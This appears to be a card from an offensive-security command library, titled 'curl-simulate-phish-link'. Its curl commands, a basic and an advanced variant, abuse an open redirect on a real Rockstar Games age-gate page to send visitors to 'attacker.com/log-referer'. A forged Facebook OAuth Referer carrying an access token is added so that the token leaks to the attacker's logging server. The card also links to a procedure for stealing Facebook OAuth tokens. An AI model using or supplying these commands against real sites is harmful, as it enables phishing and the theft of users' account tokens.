---
id: cmd-curl-simulate-phish-link
data: >-
  curl -X GET
  "https://www.rockstargames.com/GTAOnline/restricted-content/agegate/form?next=http://attacker.com/log-referer"
  --referer "https://www.facebook.com/dialog/oauth?access_token=FAKE_TOKEN"
tags:
  - phishing
  - referer
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:35.646Z'
verified: false
validated: true
submitted: true
---
# curl-simulate-phish-link

## Command

```bash
curl -X GET "https://www.rockstargames.com/GTAOnline/restricted-content/agegate/form?next=http://attacker.com/log-referer" --referer "https://www.facebook.com/dialog/oauth?access_token=FAKE_TOKEN"
```

## Description

This command simulates a phishing request through the open redirect, setting a fake Referer header mimicking a Facebook OAuth flow to test token leakage to the attacker's server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specify GET method | Yes |
| `--referer` | Set custom Referer header | Yes |
| `?next=http://attacker.com/log-referer` | Redirect to logging endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.rockstargames.com/GTAOnline/restricted-content/agegate/form?next=http://attacker.com/log-referer" --referer "https://www.facebook.com/dialog/oauth?access_token=FAKE_TOKEN"
```

### Advanced Usage

```bash
curl -X GET -H "Cookie: session=abc" "https://www.rockstargames.com/GTAOnline/restricted-content/agegate/form?next=http://attacker.com/log-referer" --referer "https://www.facebook.com/dialog/oauth?access_token=FAKE_TOKEN&client_id=123"
```

## Expected Output

Redirect response leading to the attacker's server, where logs would capture the Referer header containing the simulated token.

## Related

- [[Related Procedure|procedures/Steal-Facebook-OAuth-Token-via-Referer]]
